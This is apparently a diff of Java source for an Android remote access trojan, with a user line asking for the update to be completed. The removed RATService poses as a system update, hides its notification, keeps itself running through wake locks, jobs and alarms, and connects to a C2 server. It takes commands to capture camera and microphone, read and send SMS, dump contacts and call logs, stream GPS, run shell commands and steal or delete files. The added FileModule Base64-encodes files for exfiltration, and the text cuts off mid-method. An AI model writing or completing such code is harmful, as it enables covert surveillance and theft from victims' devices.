@@ -1,871 +1,447 @@
-package com.android.system.update;
+this is it make it complete with the update for me remember all imports necessary 
 
-import android.app.AlarmManager;
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.app.PendingIntent;
-import android.app.Service;
-import android.app.job.JobInfo;
-import android.app.job.JobScheduler;
-import android.content.ComponentName;
+package com.android.system.update.modules;
+
 import android.content.Context;
-import android.content.Intent;
-import android.content.SharedPreferences;
-import android.location.Location;
-import android.location.LocationListener;
-import android.location.LocationManager;
-import android.os.Binder;
-import android.os.Build;
-import android.os.Bundle;
-import android.os.Handler;
-import android.os.HandlerThread;
-import android.os.IBinder;
-import android.os.Looper;
-import android.os.PowerManager;
-import android.os.RemoteException;
-import android.os.SystemClock;
-import android.util.Log;
+import android.os.Environment;
+import android.util.Base64;
+import android.webkit.MimeTypeMap;
 
-import androidx.core.app.NotificationCompat;
-import androidx.core.app.ActivityCompat;
-import android.Manifest;
-import android.content.pm.PackageManager;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
 
-import com.android.system.update.modules.*;
-
-import org.json.JSONException;
+import org.json.JSONArray;
 import org.json.JSONObject;
+import org.json.JSONException;
 
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.PrintWriter;
-import java.net.InetSocketAddress;
-import java.net.Socket;
-import java.net.SocketTimeoutException;
-import java.util.concurrent.atomic.AtomicBoolean;
-
-public class RATService extends Service {
-    private static final String CHANNEL_ID = "SystemUpdateChannel";
-    private static final int NOTIFICATION_ID = 1337;
-    private static final String TAG = "SystemService";
-    private static final int JOB_ID = 1001;
-    private static final int PERSISTENCE_JOB_ID = 1002;
-    private static final long RESTART_DELAY_MS = 5000;
-    private static final long CHECK_INTERVAL_MS = 45000;
-    private static final int CONNECT_TIMEOUT = 15000; // 15 seconds
-    private static final int SOCKET_TIMEOUT = 30000;  // 30 seconds
-    private static final int MAX_RETRY_DELAY = 60000; // 60 seconds max
+public class FileModule {
+    private Context context;
+    private static final int MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB limit for transfers
     
-    private Socket socket;
-    private PrintWriter out;
-    private BufferedReader in;
-    private AtomicBoolean isRunning = new AtomicBoolean(true);
-    private Thread connectionThread;
-    private Thread watchdogThread;
-    private static volatile RATService instance;
-    private PowerManager.WakeLock wakeLock;
-    private int currentRetryDelay = 5000; // Start with 5 seconds
-    
-    // Location tracking variables
-    private LocationManager locationManager;
-    private LocationListener locationListener;
-    private HandlerThread locationThread;
-    private Handler locationHandler;
-    private boolean isLocationTracking = false;
-    
-    // Modules
-    private CameraModule cameraModule;
-    private MicModule micModule;
-    private LocationModule locationModule;
-    private SmsModule smsModule;
-    private CallsModule callsModule;
-    private ContactsModule contactsModule;
-    private FileModule fileModule;
-    private ShellModule shellModule;
-    private DeviceModule deviceModule;
-    
-    // Binder for GuardianService communication
-    public class RATServiceBinder extends Binder {
-        public void heartbeat() throws RemoteException {
-            if (!isRunning.get()) {
-                throw new RemoteException("Service is not running");
-            }
-        }
+    public FileModule(Context context) {
+        this.context = context;
     }
     
-    private final RATServiceBinder binder = new RATServiceBinder();
-    
-    public static RATService getInstance() {
-        return instance;
-    }
-    
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        instance = this;
-        AppController.setConnectionService(this);
-        
-        Log.d(TAG, "System service initialized");
-        
-        // Acquire wake lock to prevent CPU sleep
-        acquireWakeLock();
-        
-        createNotificationChannel();
-        startForeground(NOTIFICATION_ID, createNotification());
-        
-        // Initialize location manager
-        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-        startLocationThread();
-        
-        // Initialize modules based on config
-        if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
-        if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
-        if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
-        if (Config.ENABLE_SMS) smsModule = new SmsModule(this);
-        if (Config.ENABLE_CALLS) callsModule = new CallsModule(this);
-        if (Config.ENABLE_CONTACTS) contactsModule = new ContactsModule(this);
-        if (Config.ENABLE_FILES) fileModule = new FileModule(this);
-        if (Config.ENABLE_SHELL) shellModule = new ShellModule();
-        deviceModule = new DeviceModule(this);
-        
-        // Start internal watchdog
-        startWatchdog();
-        
-        // Schedule all persistence mechanisms
-        scheduleAllJobs();
-        
-        // Set that service should run on boot
-        setRunOnBoot(true);
-        
-        // Start connection thread
-        startConnection();
-    }
-    
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                CHANNEL_ID,
-                "System Service",
-                NotificationManager.IMPORTANCE_MIN
-            );
-            channel.setDescription("System optimization service");
-            channel.setSound(null, null);
-            channel.enableVibration(false);
-            channel.setShowBadge(false);
-            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
-            
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(channel);
-        }
-    }
-    
-    private Notification createNotification() {
-        int icon = android.R.drawable.stat_sys_download_done;
-        
-        return new NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("System Update Service")
-            .setContentText("Optimizing system performance")
-            .setSmallIcon(icon)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setOngoing(true)
-            .setSilent(true)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-            .build();
-    }
-    
-    private void acquireWakeLock() {
+    public String listFiles(String path) {
         try {
-            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-            wakeLock = powerManager.newWakeLock(
-                PowerManager.PARTIAL_WAKE_LOCK,
-                "SystemService::WakeLock"
-            );
-            wakeLock.setReferenceCounted(false);
-            wakeLock.acquire(10 * 60 * 1000L); // 10 minute timeout, will auto-renew
-            Log.d(TAG, "Wake lock acquired");
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to acquire wake lock", e);
-        }
-    }
-    
-    private void startWatchdog() {
-        watchdogThread = new Thread(() -> {
-            while (isRunning.get()) {
-                try {
-                    Thread.sleep(CHECK_INTERVAL_MS);
-                    
-                    // Check if connection thread is alive
-                    if (connectionThread == null || !connectionThread.isAlive()) {
-                        Log.w(TAG, "Connection thread dead, restarting...");
-                        startConnection();
-                    }
-                    
-                    // Refresh wake lock
-                    if (wakeLock != null && !wakeLock.isHeld()) {
-                        acquireWakeLock();
-                    }
-                    
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                    break;
-                } catch (Exception e) {
-                    Log.e(TAG, "Watchdog error", e);
-                }
-            }
-        });
-        watchdogThread.start();
-    }
-    
-    private void startLocationThread() {
-        locationThread = new HandlerThread("LocationThread");
-        locationThread.start();
-        locationHandler = new Handler(locationThread.getLooper());
-    }
-    
-    private void scheduleAllJobs() {
-        scheduleJobSchedulerRestart();
-        schedulePersistenceJob();
-        scheduleCheckAlarm();
-    }
-    
-    private void scheduleCheckAlarm() {
-        Intent intent = new Intent(this, RestartReceiver.class);
-        intent.setAction("CHECK_SERVICE");
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(
-            this, 3, intent, 
-            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-        
-        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        if (alarmManager != null) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                alarmManager.setExactAndAllowWhileIdle(
-                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
-                    pendingIntent
-                );
+            File dir;
+            if (path == null || path.isEmpty() || path.equals("/")) {
+                dir = Environment.getExternalStorageDirectory();
             } else {
-                alarmManager.setExact(
-                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
-                    pendingIntent
-                );
-            }
-            Log.d(TAG, "Check alarm scheduled for " + (CHECK_INTERVAL_MS/1000) + " seconds");
-        }
-    }
-    
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "System service onStartCommand");
-        scheduleAllJobs();
-        return START_STICKY;
-    }
-    
-    private void schedulePersistenceJob() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            try {
-                ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
-                JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
-                        .setPeriodic(15 * 60 * 1000)
-                        .setPersisted(true)
-                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
-                        .setBackoffCriteria(30000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
-                        .build();
-                
-                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
-                jobScheduler.schedule(jobInfo);
-                Log.d(TAG, "Persistence job scheduled");
-            } catch (Exception e) {
-                Log.e(TAG, "Error scheduling persistence job", e);
-            }
-        }
-    }
-    
-    private void scheduleJobSchedulerRestart() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            try {
-                ComponentName componentName = new ComponentName(this, JobSchedulerService.class);
-                JobInfo jobInfo = new JobInfo.Builder(JOB_ID, componentName)
-                        .setMinimumLatency(RESTART_DELAY_MS)
-                        .setOverrideDeadline(RESTART_DELAY_MS * 2)
-                        .setPersisted(true)
-                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
-                        .build();
-                
-                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
-                jobScheduler.schedule(jobInfo);
-                Log.d(TAG, "Restart job scheduled");
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to schedule restart job", e);
-            }
-        }
-    }
-    
-    private void setRunOnBoot(boolean shouldRun) {
-        SharedPreferences prefs = getSharedPreferences("service_prefs", MODE_PRIVATE);
-        prefs.edit().putBoolean("should_run", shouldRun).apply();
-    }
-    
-    private void startConnection() {
-        if (connectionThread != null && connectionThread.isAlive()) {
-            connectionThread.interrupt();
-        }
-        
-        connectionThread = new Thread(() -> {
-            while (isRunning.get()) {
-                try {
-                    // Connect with timeout
-                    socket = new Socket();
-                    socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
-                    socket.setSoTimeout(SOCKET_TIMEOUT);
-                    
-                    out = new PrintWriter(socket.getOutputStream(), true);
-                    in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
-                    
-                    Log.d(TAG, "Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
-                    
-                    // Reset retry delay on successful connection
-                    currentRetryDelay = 5000;
-                    
-                    // Send initial device info in pipe-delimited format
-                    sendDeviceInfo();
-                    
-                    String line;
-                    while (isRunning.get() && (line = in.readLine()) != null) {
-                        processCommand(line);
-                    }
-                    
-                } catch (SocketTimeoutException e) {
-                    Log.e(TAG, "Socket timeout", e);
-                } catch (IOException e) {
-                    Log.e(TAG, "Connection error", e);
-                } catch (Exception e) {
-                    Log.e(TAG, "Unexpected error", e);
-                } finally {
-                    closeConnection();
-                }
-                
-                // Exponential backoff for retries
-                if (isRunning.get()) {
-                    try {
-                        Log.d(TAG, "Retrying in " + (currentRetryDelay/1000) + " seconds");
-                        Thread.sleep(currentRetryDelay);
-                        
-                        // Increase retry delay exponentially, up to max
-                        currentRetryDelay = Math.min(currentRetryDelay * 2, MAX_RETRY_DELAY);
-                    } catch (InterruptedException ie) {
-                        Thread.currentThread().interrupt();
-                        break;
-                    }
-                }
-            }
-        });
-        connectionThread.start();
-    }
-    
-    private void closeConnection() {
-        try {
-            if (out != null) {
-                out.close();
-                out = null;
-            }
-            if (in != null) {
-                in.close();
-                in = null;
-            }
-            if (socket != null && !socket.isClosed()) {
-                socket.close();
-                socket = null;
-            }
-        } catch (IOException e) {
-            Log.e(TAG, "Error closing connection", e);
-        }
-    }
-    
-    private void sendDeviceInfo() {
-        String info = String.format("DEVICE|%s|%s|%s|%s|%s",
-            getUniqueDeviceId(),
-            Build.MANUFACTURER,
-            Build.MODEL,
-            Build.VERSION.RELEASE,
-            Build.VERSION.SDK_INT
-        );
-        sendCommand(info);
-        Log.d(TAG, "Sent device info: " + info);
-    }
-    
-    private void sendCommand(String data) {
-        if (out != null) {
-            out.println(data);
-            out.flush();
-        }
-    }
-    
-    private void processCommand(String command) {
-        String[] parts = command.split("\\|", 2);
-        String cmd = parts[0].toLowerCase().trim(); // Normalize to lowercase
-        String args = parts.length > 1 ? parts[1] : "";
-        
-        Log.d(TAG, "Received command: " + cmd + " with args: " + args);
-        
-        switch (cmd) {
-            case "ping":
-                sendCommand("PONG");
-                break;
-                
-            case "info":
-            case "device_info":
-                if (deviceModule != null) {
-                    String result = deviceModule.getDeviceInfo();
-                    sendCommand("INFO|" + result);
-                } else {
-                    sendCommand("INFO|ERROR: Device module not available");
-                }
-                break;
-                
-            case "location":
-            case "get_location":
-                if (locationModule != null) {
-                    String result = locationModule.getLocation();
-                    sendCommand("LOCATION|" + result);
-                } else {
-                    sendCommand("LOCATION|ERROR: Location module not available");
-                }
-                break;
-                
-            case "location_stream":
-                handleLocationStreamCommand(args);
-                break;
-                
-            case "camera":
-            case "camera_photo":
-                if (cameraModule != null) {
-                    String result = cameraModule.takePhoto();
-                    sendCommand("CAMERA|" + result);
-                } else {
-                    sendCommand("CAMERA|ERROR: Camera module not available");
-                }
-                break;
-                
-            case "sms":
-            case "get_sms":
-                if (smsModule != null) {
-                    String result = smsModule.getSms();
-                    sendCommand("SMS|" + result);
-                } else {
-                    sendCommand("SMS|ERROR: SMS module not available");
-                }
-                break;
-                
-            case "calls":
-            case "get_calls":
-                if (callsModule != null) {
-                    String result = callsModule.getCallLogs();
-                    sendCommand("CALLS|" + result);
-                } else {
-                    sendCommand("CALLS|ERROR: Calls module not available");
-                }
-                break;
-                
-            case "contacts":
-            case "get_contacts":
-                if (contactsModule != null) {
-                    String result = contactsModule.getContacts();
-                    sendCommand("CONTACTS|" + result);
-                } else {
-                    sendCommand("CONTACTS|ERROR: Contacts module not available");
-                }
-                break;
-                
-            // FILE OPERATIONS - ADD THESE CASES
-            case "files_list":
-            case "list_files":
-                if (fileModule != null) {
-                    String result = fileModule.listFiles(args);
-                    sendCommand("FILES|" + result);
-                } else {
-                    sendCommand("FILES|ERROR: File module not available");
-                }
-                break;
-                
-            case "file_get":
-            case "download":
-                if (fileModule != null) {
-                    String result = fileModule.getFile(args);
-                    sendCommand("FILE_GET|" + result);
-                } else {
-                    sendCommand("FILE_GET|ERROR: File module not available");
-                }
-                break;
-                
-            case "file_delete":
-            case "delete":
-                if (fileModule != null) {
-                    String result = fileModule.deleteFile(args);
-                    sendCommand("FILE_DELETE|" + result);
-                } else {
-                    sendCommand("FILE_DELETE|ERROR: File module not available");
-                }
-                break;
-                
-            case "file_rename":
-            case "rename":
-                if (fileModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = fileModule.renameFile(parts2[0], parts2[1]);
-                    sendCommand("FILE_RENAME|" + result);
-                } else {
-                    sendCommand("FILE_RENAME|ERROR: Invalid format or module unavailable");
-                }
-                break;
-                
-            case "create_folder":
-            case "mkdir":
-                if (fileModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = fileModule.createFolder(parts2[0], parts2[1]);
-                    sendCommand("CREATE_FOLDER|" + result);
-                } else {
-                    sendCommand("CREATE_FOLDER|ERROR: Invalid format or module unavailable");
-                }
-                break;
-                
-            case "file_zip":
-            case "zip":
-                if (fileModule != null) {
-                    String result = fileModule.zipFile(args);
-                    sendCommand("FILE_ZIP|" + result);
-                } else {
-                    sendCommand("FILE_ZIP|ERROR: File module not available");
-                }
-                break;
-                
-            case "file_upload":
-            case "upload":
-                if (fileModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 3);
-                    if (parts2.length == 3) {
-                        String result = fileModule.uploadFile(parts2[0], parts2[1], parts2[2]);
-                        sendCommand("FILE_UPLOAD|" + result);
-                    } else {
-                        sendCommand("FILE_UPLOAD|ERROR: Invalid format");
-                    }
-                } else {
-                    sendCommand("FILE_UPLOAD|ERROR: File module not available");
-                }
-                break;
-                
-            case "search_files":
-                if (fileModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = fileModule.searchFiles(parts2[0], parts2[1]);
-                    sendCommand("SEARCH_FILES|" + result);
-                } else {
-                    sendCommand("SEARCH_FILES|ERROR: Invalid format");
-                }
-                break;
-                
-            case "storage_info":
-                if (fileModule != null) {
-                    String result = fileModule.getStorageInfo();
-                    sendCommand("STORAGE_INFO|" + result);
-                } else {
-                    sendCommand("STORAGE_INFO|ERROR: File module not available");
-                }
-                break;
-                
-            case "mic":
-            case "mic_start":
-                if (micModule != null) {
-                    String result = micModule.startRecording(30);
-                    sendCommand("MIC|" + result);
-                } else {
-                    sendCommand("MIC|ERROR: Microphone module not available");
-                }
-                break;
-                
-            case "mic_stop":
-                if (micModule != null) {
-                    String result = micModule.stopRecording();
-                    sendCommand("MIC_STOP|" + result);
-                } else {
-                    sendCommand("MIC_STOP|ERROR: Microphone module not available");
-                }
-                break;
-                
-            case "sms_send":
-                if (smsModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = smsModule.sendSms(parts2[0], parts2[1]);
-                    sendCommand("SMS_SEND|" + result);
-                } else {
-                    sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
-                }
-                break;
-                
-            case "shell":
-            case "exec":
-                if (shellModule != null) {
-                    String result = shellModule.executeCommand(args);
-                    sendCommand("SHELL|" + result);
-                } else {
-                    sendCommand("SHELL|ERROR: Shell module not available");
-                }
-                break;
-                
-            case "help":
-                sendCommand("HELP|Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping");
-                break;
-                
-            default:
-                sendCommand("UNKNOWN_CMD|" + cmd);
-                break;
-        }
-    }
-    
-    // Handle location streaming commands
-    private void handleLocationStreamCommand(String args) {
-        args = args.trim().toLowerCase();
-        
-        if (args.equals("start") || args.equals("begin") || args.equals("on")) {
-            startLocationTracking();
-        } else if (args.equals("stop") || args.equals("end") || args.equals("off")) {
-            stopLocationTracking();
-        } else if (args.isEmpty()) {
-            // Return current tracking status
-            sendCommand("LOCATION_STREAM|" + (isLocationTracking ? "active" : "inactive"));
-        } else {
-            sendCommand("LOCATION_STREAM|error: Unknown parameter. Use 'start' or 'stop'");
-        }
-    }
-    
-    // Start live location tracking
-    private void startLocationTracking() {
-        if (!checkLocationPermission()) {
-            sendCommand("LOCATION_STREAM|error: No location permission");
-            return;
-        }
-        
-        if (isLocationTracking) {
-            sendCommand("LOCATION_STREAM|already active");
-            return;
-        }
-        
-        try {
-            locationListener = new LocationListener() {
-                @Override
-                public void onLocationChanged(Location location) {
-                    // Send location update immediately
-                    String locationJson = createLocationJson(location);
-                    sendCommand("LOCATION_UPDATE|" + locationJson);
-                    Log.d(TAG, "Location update sent: " + location.getLatitude() + "," + location.getLongitude());
-                }
-                
-                @Override
-                public void onStatusChanged(String provider, int status, Bundle extras) {
-                    Log.d(TAG, "Location provider status changed: " + provider + " status: " + status);
-                }
-                
-                @Override
-                public void onProviderEnabled(String provider) {
-                    Log.d(TAG, "Location provider enabled: " + provider);
-                }
-                
-                @Override
-                public void onProviderDisabled(String provider) {
-                    Log.d(TAG, "Location provider disabled: " + provider);
-                    sendCommand("LOCATION_STREAM|warning: " + provider + " disabled");
-                }
-            };
-            
-            // Request location updates every 3 seconds, or when device moves 5 meters
-            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                locationManager.requestLocationUpdates(
-                    LocationManager.GPS_PROVIDER,
-                    3000,   // 3 seconds
-                    5,      // 5 meters
-                    locationListener,
-                    locationHandler.getLooper()
-                );
-                Log.d(TAG, "GPS location tracking started");
+                dir = new File(path);
             }
             
-            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                locationManager.requestLocationUpdates(
-                    LocationManager.NETWORK_PROVIDER,
-                    3000,
-                    5,
-                    locationListener,
-                    locationHandler.getLooper()
-                );
-                Log.d(TAG, "Network location tracking started");
+            if (!dir.exists()) {
+                JSONObject error = new JSONObject();
+                error.put("error", "Directory does not exist");
+                error.put("path", path);
+                error.put("success", false);
+                return error.toString();
             }
             
-            isLocationTracking = true;
-            sendCommand("LOCATION_STREAM|started");
-            
-            // Get initial location immediately
-            Location lastLocation = getBestLastKnownLocation();
-            if (lastLocation != null) {
-                String locationJson = createLocationJson(lastLocation);
-                sendCommand("LOCATION_UPDATE|" + locationJson);
+            if (!dir.canRead()) {
+                JSONObject error = new JSONObject();
+                error.put("error", "Cannot read directory - permission denied");
+                error.put("path", path);
+                error.put("success", false);
+                return error.toString();
             }
             
-        } catch (SecurityException e) {
-            Log.e(TAG, "Security exception starting location tracking", e);
-            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
-        } catch (Exception e) {
-            Log.e(TAG, "Error starting location tracking", e);
-            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
-        }
-    }
-    
-    // Stop live location tracking
-    private void stopLocationTracking() {
-        if (locationManager != null && locationListener != null) {
-            locationManager.removeUpdates(locationListener);
-            locationListener = null;
-            isLocationTracking = false;
-            sendCommand("LOCATION_STREAM|stopped");
-            Log.d(TAG, "Location tracking stopped");
-        } else {
-            sendCommand("LOCATION_STREAM|already inactive");
-        }
-    }
-    
-    // Get best last known location
-    private Location getBestLastKnownLocation() {
-        Location bestLocation = null;
-        
-        try {
-            if (checkLocationPermission()) {
-                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                    Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                    if (gpsLocation != null && (bestLocation == null || 
-                        gpsLocation.getAccuracy() < bestLocation.getAccuracy())) {
-                        bestLocation = gpsLocation;
+            JSONObject result = new JSONObject();
+            result.put("current_path", dir.getAbsolutePath());
+            result.put("parent_path", dir.getParent() != null ? dir.getParent() : "");
+            result.put("success", true);
+            
+            JSONArray filesList = new JSONArray();
+            File[] files = dir.listFiles();
+            
+            if (files != null) {
+                for (File file : files) {
+                    JSONObject fileObj = new JSONObject();
+                    fileObj.put("name", file.getName());
+                    fileObj.put("path", file.getAbsolutePath());
+                    fileObj.put("isDirectory", file.isDirectory());
+                    fileObj.put("size", file.length());
+                    fileObj.put("lastModified", file.lastModified());
+                    fileObj.put("canRead", file.canRead());
+                    fileObj.put("canWrite", file.canWrite());
+                    fileObj.put("isHidden", file.isHidden());
+                    
+                    if (!file.isDirectory()) {
+                        String extension = getFileExtension(file.getName());
+                        fileObj.put("extension", extension);
+                        fileObj.put("mimeType", getMimeType(file.getName()));
                     }
-                }
-                
-                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                    Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                    if (networkLocation != null && (bestLocation == null || 
-                        networkLocation.getAccuracy() < bestLocation.getAccuracy())) {
-                        bestLocation = networkLocation;
-                    }
+                    
+                    filesList.put(fileObj);
                 }
             }
-        } catch (SecurityException e) {
-            Log.e(TAG, "Security exception getting last known location", e);
-        }
-        
-        return bestLocation;
-    }
-    
-    // Check location permission
-    private boolean checkLocationPermission() {
-        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-                == PackageManager.PERMISSION_GRANTED ||
-               ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
-                == PackageManager.PERMISSION_GRANTED;
-    }
-    
-    // Create JSON from location
-    private String createLocationJson(Location location) {
-        try {
-            JSONObject json = new JSONObject();
-            json.put("latitude", location.getLatitude());
-            json.put("longitude", location.getLongitude());
-            json.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : 0);
-            json.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
-            json.put("bearing", location.hasBearing() ? location.getBearing() : 0);
-            json.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
-            json.put("provider", location.getProvider());
-            json.put("time", location.getTime());
-            json.put("timestamp", System.currentTimeMillis());
-            return json.toString();
+            
+            result.put("files", filesList);
+            result.put("total", filesList.length());
+            
+            return result.toString();
+            
         } catch (JSONException e) {
-            return "{\"error\":\"JSON creation error\"}";
-        }
-    }
-    
-    private String getUniqueDeviceId() {
-        SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
-        String deviceId = prefs.getString("device_id", null);
-        if (deviceId == null) {
-            deviceId = java.util.UUID.randomUUID().toString();
-            prefs.edit().putString("device_id", deviceId).apply();
-        }
-        return deviceId;
-    }
-    
-    private void scheduleRestartWithAlarm() {
-        Intent restartIntent = new Intent(this, RATService.class);
-        PendingIntent pendingIntent = PendingIntent.getService(
-            this, 1, restartIntent, 
-            PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
-        
-        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        if (alarmManager != null) {
-            alarmManager.set(
-                AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                SystemClock.elapsedRealtime() + RESTART_DELAY_MS, 
-                pendingIntent);
-            Log.d(TAG, "Restart scheduled");
-        }
-    }
-    
-    @Override
-    public void onTaskRemoved(Intent rootIntent) {
-        super.onTaskRemoved(rootIntent);
-        Log.d(TAG, "Task removed - normal operation");
-        scheduleAllJobs();
-        scheduleRestartWithAlarm();
-    }
-    
-    @Override
-    public IBinder onBind(Intent intent) {
-        return binder;
-    }
-    
-    @Override
-    public void onDestroy() {
-        Log.d(TAG, "System service onDestroy");
-        
-        // Stop location tracking
-        stopLocationTracking();
-        
-        // Clean up location thread
-        if (locationThread != null) {
-            locationThread.quitSafely();
-            try {
-                locationThread.join();
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            }
-        }
-        
-        isRunning.set(false);
-        AppController.clearConnectionService();
-        instance = null;
-        
-        closeConnection();
-        
-        try {
-            if (connectionThread != null) connectionThread.interrupt();
-            if (watchdogThread != null) watchdogThread.interrupt();
-            if (wakeLock != null && wakeLock.isHeld()) {
-                wakeLock.release();
-            }
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
         } catch (Exception e) {
             e.printStackTrace();
+            return createErrorResponse(e.getMessage());
+        }
+    }
+    
+    public String getFile(String path) {
+        try {
+            File file = new File(path);
+            if (!file.exists()) {
+                return createErrorResponse("File not found");
+            }
+            
+            if (!file.canRead()) {
+                return createErrorResponse("Cannot read file - permission denied");
+            }
+            
+            if (file.length() > MAX_FILE_SIZE) {
+                return createErrorResponse("File too large (max " + (MAX_FILE_SIZE/1024/1024) + "MB)");
+            }
+            
+            FileInputStream fis = new FileInputStream(file);
+            byte[] bytes = new byte[(int) file.length()];
+            fis.read(bytes);
+            fis.close();
+            
+            JSONObject response = new JSONObject();
+            response.put("success", true);
+            response.put("name", file.getName());
+            response.put("size", file.length());
+            response.put("data", Base64.encodeToString(bytes, Base64.DEFAULT));
+            response.put("mimeType", getMimeType(file.getName()));
+            
+            return response.toString();
+            
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
+        } catch (Exception e) {
+            e.printStackTrace();
+            return createErrorResponse(e.getMessage());
+        }
+    }
+    
+    public String deleteFile(String path) {
+        try {
+            File file = new File(path);
+            if (!file.exists()) {
+                return createErrorResponse("File not found");
+            }
+            
+            boolean deleted;
+            if (file.isDirectory()) {
+                deleted = deleteDirectory(file);
+            } else {
+                deleted = file.delete();
+            }
+            
+            if (deleted) {
+                JSONObject response = new JSONObject();
+                response.put("success", true);
+                response.put("message", "Deleted successfully");
+                response.put("path", path);
+                return response.toString();
+            } else {
+                return createErrorResponse("Failed to delete");
+            }
+            
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
+        } catch (Exception e) {
+            e.printStackTrace();
+            return createErrorResponse(e.getMessage());
+        }
+    }
+    
+    private boolean deleteDirectory(File directory) {
+        if (directory.exists()) {
+            File[] files = directory.listFiles();
+            if (files != null) {
+                for (File file : files) {
+                    if (file.isDirectory()) {
+                        deleteDirectory(file);
+                    } else {
+                        file.delete();
+                    }
+                }
+            }
+        }
+        return directory.delete();
+    }
+    
+    public String createFolder(String path, String folderName) {
+        try {
+            File folder = new File(path, folderName);
+            if (folder.exists()) {
+                return createErrorResponse("Folder already exists");
+            }
+            
+            boolean created = folder.mkdirs();
+            if (created) {
+                JSONObject response = new JSONObject();
+                response.put("success", true);
+                response.put("message", "Folder created");
+                response.put("path", folder.getAbsolutePath());
+                return response.toString();
+            } else {
+                return createErrorResponse("Failed to create folder");
+            }
+            
+        } catch (JSONException e) {
+            e.printStackTrace();
+            return createErrorResponse("JSON error: " + e.getMessage());
+        } catch (Exception e) {
+            e.printStackTrace();
+            return createErrorResponse(e.getMessage());
+        }
+    }
+    
+    public String renameFile(String oldPath, String newName) {
+        try {
+            File oldFile = new File(oldPath);
+            File parent = oldFile.getParentFile();
+            File newFile = new File(parent, newName);
+            
+            if (newFile.exists()) {
+                return createErrorResponse("A file with that name already exists");
+            }
+            
+            boolean renamed = oldFile.renameTo(newFile);
+            if (renamed) {
+                JSONObject response = new JSONObject();
+                response.put("success", true);
+                response.put("message", "Renamed successfully");
